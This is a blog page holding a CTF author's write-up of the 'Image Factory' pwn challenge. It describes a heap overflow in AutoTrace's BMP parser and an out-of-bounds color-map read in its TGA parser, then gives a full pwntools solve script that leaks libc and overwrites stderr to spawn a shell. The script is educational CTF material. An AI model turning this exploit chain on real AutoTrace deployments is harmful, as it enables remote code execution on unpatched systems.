<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Bauhinia CTF 2023: Image Factory | Black Bauhinia</title>

<meta name="keywords" content="ctf" />
<meta name="description" content="Last year, I created a pwn challenge for the Bauhinia CTF competition. Personally, I consider it to be the most difficult pwn challenge I have ever created, and here I would like to share the challenge and its intended solution. At the same time, I will discuss common solving approaches you may find useful for this type of challenge.
 Overview  As a CTFer, we have the obligation to code any program in a secure manner, even if a university assignment, right?">
<meta name="author" content="cire meat pop">
<link rel="canonical" href="https://b6a.black/posts/2024-03-10-b6actf-image-factory/" />
<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://b6a.black/favicon.ico">

<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.91.0" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M67YZZ2MP1');
</script>



<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>


<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 


<meta property="og:title" content="Bauhinia CTF 2023: Image Factory" />
<meta property="og:description" content="Last year, I created a pwn challenge for the Bauhinia CTF competition. Personally, I consider it to be the most difficult pwn challenge I have ever created, and here I would like to share the challenge and its intended solution. At the same time, I will discuss common solving approaches you may find useful for this type of challenge.
 Overview  As a CTFer, we have the obligation to code any program in a secure manner, even if a university assignment, right?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2024-03-10-b6actf-image-factory/" />
<meta property="og:image" content="https://b6a.black/images/2024-03-10-b6actf-image-factory/cover.jpg" /><meta property="article:published_time" content="2024-03-10T19:47:00+08:00" />
<meta property="article:modified_time" content="2024-03-10T19:47:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://b6a.black/images/2024-03-10-b6actf-image-factory/cover.jpg" />
<meta name="twitter:title" content="Bauhinia CTF 2023: Image Factory"/>
<meta name="twitter:description" content="Last year, I created a pwn challenge for the Bauhinia CTF competition. Personally, I consider it to be the most difficult pwn challenge I have ever created, and here I would like to share the challenge and its intended solution. At the same time, I will discuss common solving approaches you may find useful for this type of challenge.
 Overview  As a CTFer, we have the obligation to code any program in a secure manner, even if a university assignment, right?"/>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Bauhinia CTF 2023: Image Factory",
  "name": "Bauhinia CTF 2023: Image Factory",
  "description": "Last year, I created a pwn challenge for the Bauhinia CTF competition. Personally, I consider it to be the most difficult pwn challenge I have ever created, and here I would like …",
  "keywords": [
    "ctf"
  ],
  "articleBody": "Last year, I created a pwn challenge for the Bauhinia CTF competition. Personally, I consider it to be the most difficult pwn challenge I have ever created, and here I would like to share the challenge and its intended solution. At the same time, I will discuss common solving approaches you may find useful for this type of challenge.\n Overview  As a CTFer, we have the obligation to code any program in a secure manner, even if a university assignment, right? Let me share you one of them:\nIntroducing Vectorify Image Factory (VIF), the ultimate image-to-vector conversion tool. With VIF, you can effortlessly transform any image into a crisp and scalable vector format. Whether you’re a graphic designer, illustrator, or simply someone looking to enhance their visual creations, VIF has got you covered!!!\nnc HOST PORT\nAttachment: Link\nNote: All pwn challenges are running on an Ubuntu 23.04 machine.\n TL;DR: The challenge involves a hosted nc service. Once connected, you can input images in various formats, and the program will output a vector image in the format you specify (e.g., SVG).\nExample (user input indicated in red):\n sha256(myqUCdJMF3ickzcP + ???) == 0000000000000000000000(22)… ??? = 2320669\nSource image format: tga\nVector image format: svg\nImage size (max: 4096): 30\n\\x00\\x01\\x01\\x00\\x00\\x02\\x00\\x18\\x00\\x03\\xff\\x00\\x01\\x00\\x02\\x00 \\x08\\xea\\xf5\\xf5\\xf5\\xee\\xe6\\x06\\x03\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e \nhttp://www.w3.org/2000/svg\" width=“1” height=“2”  continue? n\n To Start With The attachments provided include a Dockerfile and the main.c source code. To hint that the vulnerability is not come from the source code itself, I deliberately kept the main.c file short (127 lines) and removed unrelated features, leaving only a very straightforward loop. As main.c does not appear to have any obvious bugs and the Dockerfile explicitly clone and build a external library, AutoTrace, I think it makes sense for anyone to move their eyes on investigating this image conversion library.\nA pwn challenge that requires finding vulnerabilities in an external library is likely to be a 0-day or 1-day vulnerability. In this case, from Dockerfile we know that the latest version AutoTrace is used, the chances of being a 0-day pwn are significantly increased.\nRegardless of whether it is a 0-day or 1-day vulnerability, the first step is to look for CVEs and git issues related to AutoTrace for inspiration. However, 0-day vulnerabilities may not be documented in previous CVEs or git issues, so solving a 0-day pwn challenge often requires additional steps, such as using a fuzzer to scan the program for crashes or manually inspecting the source code of the library.\n Fortunately, the AutoTrace code base is not extensive, making it easier for manual code review.\nAutoTrace AutoTrace is a utility for converting bitmap into vector graphics. In AutoTrace’s git issues, there are only a few pages, and most of them are unrelated, such as feature requests. So, let’s focus on the CVEs associated with AutoTrace.\nCVEs There are a total of 55 CVEs documented for AutoTrace. The five most recent CVEs are CVE-2022-32323, CVE-2019-19005, CVE-2019-19004, CVE-2017-9200, and CVE-2017-9199.\n The second CVE mentioned dates back to 2019 and is likely to have been fixed by now, suggesting that the challenge is either based on the 1-day vulnerability CVE-2022-32323 or it’s a 0-day. Spoil alert, it is the latter.\nUpon closer inspection, you’ll quickly realize that CVE-2022-32323 has already been patched.\n The commit diff shows that the only meaningful change is inserting a check ypos==0, the other changes are all about indentation or unrelated details. It seems that the bug fixing was an underflow caused by ypos--, which has indeed been fixed by the commit.\nTo conclude, this challenge is not the 1-day pwn of CVE-2022-32323.\nBy reading the short descriptions of the first five CVEs, you can find that all the issues are arisign from input-bmp.c and input-tga.c. This seems to be a promising entry point, as it’s possible that the developer either missed fixing the CVE or fixed it in a rather bad way that allows bypassing. Even if a CVE has been perfectly patched, the chances of finding a bug in the same file are relatively higher compared to other files.\nAfter reviewing the descriptions of other CVEs, the conclusion is that input-bmp.c is a frequent source of issues, meanwhile it’s worth including other files (such as input-pnm.c and color.c) that had associated with CVEs into the observation list.\nIf you use a fuzzer like AFL, you’ll likely discover crashes specifically in input-bmp.c. TBH, since I’m not familiar with fuzzers, it’s possible that using a different fuzzer or setting specific input patterns could yield more crashes. For someone unfamiliar with fuzzers, the best approach would be to use default parameters for fuzzing and then review the code starting from the areas where crashes occur.\nVulnerabilities Responsible disclosure alert: The upcoming vulnerabilities have not been assigned CVE numbers yet, but there are already patch commits available. The latest commit on the main branch of AutoTrace git before Bauhinia CTF 2023 is 36a72de915066fb8b9e74d7699d103e20971e241.  The intended solution for this pwn challenge involves a 0-day info leak and a 0-day libc arbitrary write vulnerability.\ninput-bmp Whether it’s a CVE or a fuzzer, it indicates that input-bmp.c is prone to vulnerability, so let’s start with this file. By cloning the autotrace repository from Github and navigating to the src directory, you’ll find input-bmp.c. The input-*.c files in the AutoTrace code base contain the parsing logic for specific image formats. For example, the logic for parsing BMP images is found only in input-bmp.c.\nThe next step is simple code reviewing. input-bmp.c has about 850 lines, and it may take some time to go through the entire file. When reviewing the code, pay attention to functions that can pose memory corruption risks, such as malloc, memcpy, strcpy, and similar functions.\nWithout further ado, let’s focus on the key point. Let’s take a look at the code around input-bmp.c:606:\nif (bpp = 16) { /* color image */ XMALLOC(image, width * height * 3 * sizeof(unsigned char)); if (masks[3].mask != 0) { channels = 4; } else { channels = 3; } } else if (Grey) /* Grey image */ { XMALLOC(image, width * height * 1 * sizeof(unsigned char)); channels = 1; } else { /* indexed image */ XMALLOC(image, width * height * 1 * sizeof(unsigned char)); channels = 1; } The image variable is used to store the chunk of pixel data, with a maximum size of width * height * 3 * sizeof(unsigned char)… wait, why is it multiplied by 3? It’s because a pixel has three different data values for RGB. However, based on the code logic above, the channels can be assigned as 4, which means a pixel can have four different data values for RGBA. Come on, be optimistic. Perhaps the variable channels is not used later in the code.\nNow, let’s see when the image variable is used. In input-bmp.c:631:\nrowstride = width * channels; ypos = height - 1; switch (bpp) { case 32: ... break; case 24: { while (ReadOK (fd, row_buf, rowbytes)) { temp = image + (ypos * rowstride); for (xpos = 0; xpos  width; ++xpos) { *(temp++) = row_buf[xpos * 3 + 2]; *(temp++) = row_buf[xpos * 3 + 1]; *(temp++) = row_buf[xpos * 3]; } if (ypos == 0) break; --ypos; /* next line */ } } break; case 16: ... break; ... } TL;DR: The parser copies the pixel data from the source image to the image chunk, and temp points to the current position where the data is being copied.\nPay attention to the line *(temp++) = row_buf[xpos * 3 + 2];. Regardless of what row_buf is, temp should be within the range of the image heap chunk, right? Otherwise, it could cause a “write out of bounds” situation.\nSince temp = image + (ypos * rowstride);, to avoid writing out of bounds, ypos * rowstride should be less than the size of the image chunk (width * height * 3).\nWell, what are the initial values of ypos and rowstride? According to the code logic, they are width * channels and height - 1, respectively. So the initial value of ypos * rowstride is width * channels * (height - 1)… wait again, I remember seeing that channels can be a maximum of 4.\nCan 4w(h-1) be greater than 3wh? Obviously yes! In other words, it can cause a “write out of bounds” situation. Here’s the heap overflow vulnerability.\nExploiting input-bmp The vulnerability we found unexpectedly turns out to be quite useful for two reasons:\n It allows us to specific the location to write. When the parser copies the data, it starts from the last line, image + 4w(h-1) + 0, image + 4w(h-1) + 1, and so on, instead of image + 0, image + 1 which would unavoidably write into a read-only chunk before hitting the desired location, leading to a segmentation fault. Starting from the last line allows us to skip the read-only chunk and directly overwrite the desired location. The loop while (ReadOK(fd, row_buf, rowbytes)) immediately exits when it reaches the end of the input image (EOF) as fd. This means we can avoid some issues about the width and height values being too large and causing the input image size to exceed stdin’s capacity. It also “accidentally” bypasses the check file_size = 0x1000 in this pwn challenge.  First, we can set the bpp and mask in the input BMP image header to trigger the vulnerability with a channels value of 4. Then, by calculating an appropriate height and width in the header, we can overwrite the contents of specific positions below the image chunk. As a pwner’s trick, we can guarantee the dynamic libraries (e.g., libc) will locate below our malloced image chunk by asking a chunk with a very large size, i.e. high channel * width * height value. It is because malloc will switch to using mmap if the user requested a chunk of sufficiently high in size.\nIf you can modify the contents of the libc, there are many methods to obtain a shell, such as modifying the libc’s Global Offset Table (GOT) or utilizing different techniques from the House of xxx series. However, these methods usually require a prior leaked libc address to bypass ASLR randomization. We would need a 0-day info leak for that!\ninput-tga I couldn’t find any information leak vulnerability in the input-bmp.c file after reviewing it, so it’s time to look at other files.\nAmong the suspicious files in the watch list are input-tga.c, input-pnm.c, and color.c. Skipping to the conclusion, there is no bug in color.c, and although input-pnm.c has a bug, it is not exploitable… ya, not all bugs can be exploited. For example, bugs that trigger an immediate segmentation fault are useless in this case, even though they can be used to claim a CVE.\nFinally, only input-tga.c remains on the list.\nBut before we start the code review, let’s imagine what an information leak vulnerability is. In traditional pwn challenges, an information leak usually refers to using the write or printf function to leak important addresses from residual memory like putting a non-null-terminated string. However, this method is not applicable in Autotrace because it doesn’t have an interactive prompt. Its only output is a vector image. So, let’s think in reverse. Since the output is just an image, can we include leaked information in that image?\nFortunately, TGA has something suitable for this purpose — the color map.\n  png)\ntypedef struct _TgaHeader { BYTE IDLength; /* 00h Size of Image ID field */ BYTE ColorMapType; /* 01h Color map type */ BYTE ImageType; /* 02h Image type code */ WORD CMapStart; /* 03h Color map origin */ WORD CMapLength; /* 05h Color map length */ BYTE CMapDepth; /* 07h Depth of color map entries */ WORD XOffset; /* 08h X origin of image */ WORD YOffset; /* 0Ah Y origin of image */ WORD Width; /* 0Ch Width of image */ WORD Height; /* 0Eh Height of image */ BYTE PixelDepth; /* 10h Image pixel size */ BYTE ImageDescriptor; /* 11h Image descriptor byte */ } TGAHEAD; TL;DR: When storing colors in TGA format, it can use the Indexed Color Mode, where each pixel doesn’t directly store RGB values but instead stores as an index. The TGA header contains a color map data chunk, and the RGB values of pixels refer to color map data[index]. If Autotrace has a flaw in implementing this feature, such as accepting a large or negative index for a pixel, there might be a chance for me to read beyond the boundaries.\nAfter understanding the color map concept, let’s proceed with the code review. First, let’s look at the implementation of “the RGB values of a pixel refer to color map data[index]” in input-tga.c:520:\nif (hdr-colorMapType == 1) { unsigned char *temp, *temp2, *temp3; unsigned char index; int xpos, ypos; temp2 = temp = image.bitmap; image.bitmap = temp3 = (unsigned char *)malloc(width * height * 3 * sizeof(unsigned char)); for (ypos = 0; ypos  height; ypos++) { for (xpos = 0; xpos  width; xpos++) { index = *temp2++; *temp3++ = cmap[3 * index + 0]; *temp3++ = cmap[3 * index + 1]; *temp3++ = cmap[3 * index + 2]; } } free(temp); free(cmap); } The RGB values of a pixel are cmap[3 * index + 0], cmap[3 * index + 1], and cmap[3 * index + 2]. Since the index is an unsigned char, it can’t be negative, but its maximum value is 0xff. Therefore, it can read up to cmap[3 * index + 2] = cmap[767]. If the size of the cmap chunk is less than 767, it means I can read beyond the boundaries!\nWhat? Checking of the index? Sorry, after going through it, there is no such thing exists.\nGetting back to the point, let’s see where cmap is created. input-tga.c:368 :\nif (hdr-colorMapType == 1) { /* We need to read in the colormap. */ int index, colors; unsigned int length; index = (hdr-colorMapIndexHi  8) | hdr-colorMapIndexLo; length = (hdr-colorMapLengthHi  8) | hdr-colorMapLengthLo; if (length == 0) { LOG(\"TGA: invalid color map length %d\\n\", length); at_exception_fatal(exp, \"TGA: invalid color map length\"); return image; } pelbytes = ROUNDUP_DIVIDE(hdr-colorMapSize, 8); colors = length + index; cmap = (unsigned char *)malloc(colors * pelbytes); ... cmap is a chunk allocated using malloc, with a size of colors * pelbytes.\ncolors is obtained by dividing hdr-colorMapSize by 8 and rounding up. pelbytes is (hdr-colorMapIndexHi colorMapIndexLo + (hdr-colorMapLengthHi colorMapLengthLo. hdr is the image header, which means it’s user input, so all hdr-* are set by the user.\nGreat! I can make cmap equal to malloc(8), and then set the color of a pixel to cmap[767]. It’s a very useful access out-of-bounds vulnerability.\nExploiting input-tga First, craft a TGA image with a small colors * pelbytes but with an index reaching 0xff. Inject it into the program and see if it crashes or shows any errors. It’s not! Run it in gdb and observe that it indeed reads beyond the boundaries! POC done!\nThen, using gdb, check if there is any address of libc or any library within the range of cmap+0 to +767 (because the offset between such addresses and libc addresses is fixed). And I found one!\nFinally, create a TGA image with the same technique as the POC. In this image, only two pixels are set. As long as the index of a pixel matches the desired address to leak, Autotrace will treat that address as an RGB value and output it as a vector image.\nFor example (input: leak0.tga; output format svg):\n http://www.w3.org/2000/svg\" width=“1” height=“2” \n That’s how I leaked the library address 0x007fcb0c9b32.\nFinal solve script Keep it short and simple, I first used the TGA exploit to leak the address, then calculated the libc base address using the offset, and finally used the BMP exploit to overwrite the contents of libc and get a shell. Here, I chose the house of apple technique to modify the IO_2_1_stderr field.\nFile payload\n leak0.tga overwrite.temp  *Note that the leak offset in leak0.tga is highly associated with the hosting machine enviornment.\n from pwn import * r = remote('chall.pwnable.hk', 20010) # ==== # utils def verify_hash(prefix, answer, difficulty): h = hashlib.sha256() h.update((prefix + answer).encode()) bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest()) return bits.startswith('0' * difficulty) def solve_pow(prefix, difficulty): i = 0 while not verify_hash(prefix, str(i), difficulty): i += 1 return str(i) def get_file_format(file_name): return file_name.split('.')[-1] def extract_address_from_svg(leak): leaks = leak.decode().split('style=\"fill:#') return leaks[1][:6]+leaks[2][:6] # functions def convert(r, file_name, to_format, end = 0): file_format = get_file_format(file_name) r.sendline(file_format) r.sendline(to_format) with open(file_name, 'rb') as f: file_content = f.read() r.sendline(str(len(file_content))) r.send(file_content) result = r.recvuntil(b'continue?')[:-9] # log.info(result) if end == 0: r.sendline('y') else: r.sendline('n') return result def craft_exploit_bmp_file(libc_base, lib_top): libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') def calc_h(target, lib_top, w): # solve h given (3*w*h) / 0x1000 *0x1000 +0x1000 - 0x10 + target - lib_top = 4*w*(h-1)  return (((target - lib_top)  12  12) + ((target - lib_top - 0x10 + 8) % 0x1000) // 4 + 0x1000 ) // w0 def address_to_bitmap_data(addr): return p64(addr)[2::-1] + p64(addr)[5:2:-1] + b'\\x00\\x00\\x00\\x00' # Perform attack 4 times by crafting 4 bmp files # overwrite0 target0 = libc_base + libc.symbols['_IO_2_1_stderr_'] - 8 # forged _wide_vtable address w0 = 2 h0 = calc_h(target0, lib_top, w0) system_addr = libc_base+libc.symbols['system'] # overwrite1 target1 = libc_base + libc.symbols['_IO_2_1_stdin_'] + - 0x120 # _IO_wide_data_2._wide_vtable w1 = 2 h1 = calc_h(target1, lib_top, w1) forged_wide_vtable_addr = target0 - 0x68 # overwrite2 target2 = libc_base + libc.symbols['_IO_2_1_stderr_'] # stderr w2 = 2 h2 = calc_h(target2, lib_top, w2) # overwrite3 target3 = libc_base + libc.symbols['_IO_2_1_stderr_'] + 216 # _IO_2_1_stderr_.vtable w3 = 2 h3 = calc_h(target3, lib_top, w3) forged_vtable_addr = libc_base+libc.symbols['_IO_wfile_jumps'] - 0x48 # forged vtable address with open('./payload/overwrite.template', 'rb') as template_file: template = template_file.read() overwrite0_content = template[:0x12] + p32(w0) + p32(h0) + template[0x12:] + address_to_bitmap_data(system_addr) overwrite1_content = template[:0x12] + p32(w1) + p32(h1) + template[0x12:] + address_to_bitmap_data(forged_wide_vtable_addr) overwrite2_content = template[:0x12] + p32(w2) + p32(h2) + template[0x12:] + address_to_bitmap_data(u64(b' sh\\x00\\x00\\x00\\x00')) overwrite3_content = template[:0x12] + p32(w3) + p32(h3) + template[0x12:] + address_to_bitmap_data(forged_vtable_addr) with open('./payload/overwrite0.bmp', 'wb') as fow0: fow0.write(overwrite0_content) with open('./payload/overwrite1.bmp', 'wb') as fow1: fow1.write(overwrite1_content) with open('./payload/overwrite2.bmp', 'wb') as fow2: fow2.write(overwrite2_content) with open('./payload/overwrite3.bmp', 'wb') as fow3: fow3.write(overwrite3_content) # ==== # POW r.recvuntil(b'sha256(') prefix = r.recvuntil(b' + ')[:-3] answer = solve_pow(prefix.decode(), 22) r.sendline(answer) # leak libs info by tga parser bug leak = convert(r, './payload/leak0.tga', 'svg') libc_info = '00'+extract_address_from_svg(leak) # the offset 0x21a200 is only fixed on Ubuntu 23.04 (HOST) machine libc_base = int.from_bytes(bytes.fromhex(libc_info), byteorder='little')-0x21a200 print(\"libc base: %s\" % hex(libc_base)) top_lib_addr = libc_base - 0x62a1000 print(\"top lib: %s\" % hex(top_lib_addr)) # perform \"house of apple\" by bmp parser bug craft_exploit_bmp_file(libc_base, top_lib_addr) convert(r, './payload/overwrite0.bmp', 'svg') convert(r, './payload/overwrite1.bmp', 'svg') convert(r, './payload/overwrite2.bmp', 'svg') convert(r, './payload/overwrite3.bmp', 'svg', 1) r.interactive() ",
  "wordCount" : "3142",
  "inLanguage": "en",
  "image":"https://b6a.black/images/2024-03-10-b6actf-image-factory/cover.jpg","datePublished": "2024-03-10T19:47:00+08:00",
  "dateModified": "2024-03-10T19:47:00+08:00",
  "author":[{
    "@type": "Person",
    "name": "cire meat pop"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b6a.black/posts/2024-03-10-b6actf-image-factory/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Black Bauhinia",
    "logo": {
      "@type": "ImageObject",
      "url": "https://b6a.black/favicon.ico"
    }
  }
}
</script>



</head>

<body class=" dark" id="top">
<noscript>
    <style type="text/css">
        .theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
            <span class="logo-switches">
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://b6a.black/about-us/" title="About Us">
                    <span>About Us</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">

    <h1 class="post-title">
      Bauhinia CTF 2023: Image Factory
    </h1>
    <div class="post-meta">

March 10, 2024&nbsp;·&nbsp;cire meat pop

</div>
  </header>
  
  
  <div class="post-content js-toc-content">
<p>Last year, I created a pwn challenge for the Bauhinia CTF competition. Personally, I consider it to be the most difficult pwn challenge I have ever created, and here I would like to share the challenge and its intended solution. At the same time, I will discuss common solving approaches you may find useful for this type of challenge.</p>

  <figure class="center" >
    <img src="/images/2024-03-10-b6actf-image-factory/cover.jpg"   />
    
  </figure>


<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
<blockquote>
<p>As a CTFer, we have the obligation to code any program in a secure manner, even if a university assignment, right?  Let me share you one of them:</p>
<p>Introducing Vectorify Image Factory (VIF), the ultimate image-to-vector conversion tool. With VIF, you can effortlessly transform any image into a crisp and scalable vector format. Whether you&rsquo;re a graphic designer, illustrator, or simply someone looking to enhance their visual creations, VIF has got you covered!!!</p>
<p><code>nc HOST PORT</code></p>
<p>Attachment: <a href="https://github.com/blackb6a/blackb6a-ctf-2023-challenges/tree/main/34-image-factory/public">Link</a></p>
<p>Note: All pwn challenges are running on an Ubuntu 23.04 machine.</p>
</blockquote>
<p>TL;DR: The challenge involves a hosted nc service. Once connected, you can input images in various formats, and the program will output a vector image in the format you specify (e.g., SVG).</p>
<p>Example (user input indicated in red):</p>
<blockquote>
<p>sha256(myqUCdJMF3ickzcP + ???) == 0000000000000000000000(22)&hellip;
??? = <span style="color:red">2320669</span></p>
<p>Source image format: <span style="color:red">tga</span></p>
<p>Vector image format: <span style="color:red">svg</span></p>
<p>Image size (max: 4096): <span style="color:red">30</span></p>
<p><span style="color:red">\x00\x01\x01\x00\x00\x02\x00\x18\x00\x03\xff\x00\x01\x00\x02\x00
\x08\xea\xf5\xf5\xf5\xee\xe6\x06\x03\x04\x00\x00\x00\x00\x00\x00\x00\x1e </span></p>
<?xml version="1.0" standalone="yes"?>
<p>&lt;svg xmlns=&ldquo;<a href="http://www.w3.org/2000/svg%22">http://www.w3.org/2000/svg&quot;</a> width=&ldquo;1&rdquo; height=&ldquo;2&rdquo;&gt;
&lt;path style=&ldquo;fill:#329b0c; stroke:none;&rdquo; d=&ldquo;M0 0L1 1L0 0z&rdquo;/&gt;
&lt;path style=&ldquo;fill:#cb7f00; stroke:none;&rdquo; d=&ldquo;M0 1L1 2L0 1z&rdquo;/&gt;
&lt;/svg&gt;
continue? <span style="color:red">n</span></p>
</blockquote>
<h2 id="to-start-with">To Start With<a hidden class="anchor" aria-hidden="true" href="#to-start-with">#</a></h2>
<p>The attachments provided include a Dockerfile and the main.c source code. To hint that the vulnerability is not come from the source code itself, I deliberately kept the main.c file short (127 lines) and removed unrelated features, leaving only a very straightforward loop. As main.c does not appear to have any obvious bugs and the Dockerfile explicitly clone and build a external library, AutoTrace, I think it makes sense for anyone to move their eyes on investigating this image conversion library.</p>
<p>A pwn challenge that requires finding vulnerabilities in an external library is likely to be a 0-day or 1-day vulnerability. In this case, from Dockerfile we know that the latest version AutoTrace is used, the chances of being a 0-day pwn are significantly increased.</p>
<p>Regardless of whether it is a 0-day or 1-day vulnerability, the first step is to look for CVEs and git issues related to AutoTrace for inspiration. However, 0-day vulnerabilities may not be documented in previous CVEs or git issues, so solving a 0-day pwn challenge often requires additional steps, such as using a fuzzer to scan the program for crashes or manually inspecting the source code of the library.</p>

  <figure class="center" >
    <img src="/images/2024-03-10-b6actf-image-factory/autotrace-files.png"   />
    
  </figure>


<p><del>Fortunately, the AutoTrace code base is not extensive, making it easier for manual code review.</del></p>
<h3 id="autotrace">AutoTrace<a hidden class="anchor" aria-hidden="true" href="#autotrace">#</a></h3>
<p><a href="https://github.com/autotrace/autotrace">AutoTrace</a> is a utility for converting bitmap into vector graphics. In AutoTrace&rsquo;s git issues, there are only a few pages, and most of them are unrelated, such as feature requests. So, let&rsquo;s focus on the CVEs associated with AutoTrace.</p>
<h3 id="cves">CVEs<a hidden class="anchor" aria-hidden="true" href="#cves">#</a></h3>
<p>There are a total of 55 CVEs documented for AutoTrace. The five most recent CVEs are CVE-2022-32323, CVE-2019-19005, CVE-2019-19004, CVE-2017-9200, and CVE-2017-9199.</p>

  <figure class="center" >
    <img src="/images/2024-03-10-b6actf-image-factory/autotrace-cves.png"   />
    
  </figure>


<p>The second CVE mentioned dates back to 2019 and is likely to have been fixed by now, suggesting that the challenge is either based on the 1-day vulnerability CVE-2022-32323 or it&rsquo;s a 0-day. Spoil alert, it is the latter.</p>
<p>Upon closer inspection, you&rsquo;ll quickly realize that CVE-2022-32323 has already been <a href="https://github.com/autotrace/autotrace/commit/2b44c173027736c64b3f379bd154c41bab745423">patched</a>.</p>

  <figure class="center" >
    <img src="/images/2024-03-10-b6actf-image-factory/cve-2022-32323-patch.png"   />
    
  </figure>


<p>The commit diff shows that the only meaningful change is inserting a check <code>ypos==0</code>, the other changes are all about indentation or unrelated details. It seems that the bug fixing was an underflow caused by <code>ypos--</code>, which has indeed been fixed by the commit.</p>
<p>To conclude, this challenge is not the 1-day pwn of CVE-2022-32323.</p>
<p>By reading the short descriptions of the first five CVEs, you can find that all the issues are arisign from <code>input-bmp.c</code> and <code>input-tga.c</code>. This seems to be a promising entry point, as it&rsquo;s possible that the developer either missed fixing the CVE or fixed it in a rather bad way that allows bypassing. Even if a CVE has been perfectly patched, the chances of finding a bug in the same file are relatively higher compared to other files.</p>
<p>After reviewing the descriptions of other CVEs, the conclusion is that <code>input-bmp.c</code> is a frequent source of issues, meanwhile it&rsquo;s worth including other files (such as <code>input-pnm.c</code> and <code>color.c</code>) that had associated with CVEs into the observation list.</p>
<p>If you use a fuzzer like AFL, you&rsquo;ll likely discover crashes specifically in <code>input-bmp.c</code>. TBH, since I&rsquo;m not familiar with fuzzers, it&rsquo;s possible that using a different fuzzer or setting specific input patterns could yield more crashes. For someone unfamiliar with fuzzers, the best approach would be to use default parameters for fuzzing and then review the code starting from the areas where crashes occur.</p>
<h2 id="vulnerabilities">Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#vulnerabilities">#</a></h2>
<div class="alert danger">
  <em>Responsible disclosure alert</em>:
The upcoming vulnerabilities have not been assigned CVE numbers yet, but there are already patch commits available. The latest commit on the main branch of AutoTrace git before Bauhinia CTF 2023 is <code>36a72de915066fb8b9e74d7699d103e20971e241</code>.
</div>
  
<p>The intended solution for this pwn challenge involves a 0-day info leak and a 0-day libc arbitrary write vulnerability.</p>
<h3 id="input-bmp">input-bmp<a hidden class="anchor" aria-hidden="true" href="#input-bmp">#</a></h3>
<p>Whether it&rsquo;s a CVE or a fuzzer, it indicates that <code>input-bmp.c</code> is prone to vulnerability, so let&rsquo;s start with this file. By cloning the autotrace repository from Github and navigating to the src directory, you&rsquo;ll find <code>input-bmp.c</code>. The <code>input-*.c</code> files in the AutoTrace code base contain the parsing logic for specific image formats. For example, the logic for parsing BMP images is found only in <code>input-bmp.c</code>.</p>
<p>The next step is simple code reviewing. <code>input-bmp.c</code> has about 850 lines, and it may take some time to go through the entire file. When reviewing the code, pay attention to functions that can pose memory corruption risks, such as <code>malloc</code>, <code>memcpy</code>, <code>strcpy</code>, and similar functions.</p>
<p>Without further ado, let&rsquo;s focus on the key point. Let&rsquo;s take a look at the code around <code>input-bmp.c:606</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (bpp <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">16</span>) {              <span style="color:#75715e">/* color image */</span>
    XMALLOC(image, width <span style="color:#f92672">*</span> height <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>));
    <span style="color:#66d9ef">if</span> (masks[<span style="color:#ae81ff">3</span>].mask <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
    {
      channels <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
    }
    <span style="color:#66d9ef">else</span>
    {
      channels <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
    }
  }
  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Grey) <span style="color:#75715e">/* Grey image */</span>
  {
    XMALLOC(image, width <span style="color:#f92672">*</span> height <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>));
    channels <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
  } <span style="color:#66d9ef">else</span> {                      <span style="color:#75715e">/* indexed image */</span>

    XMALLOC(image, width <span style="color:#f92672">*</span> height <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>));
    channels <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
  }
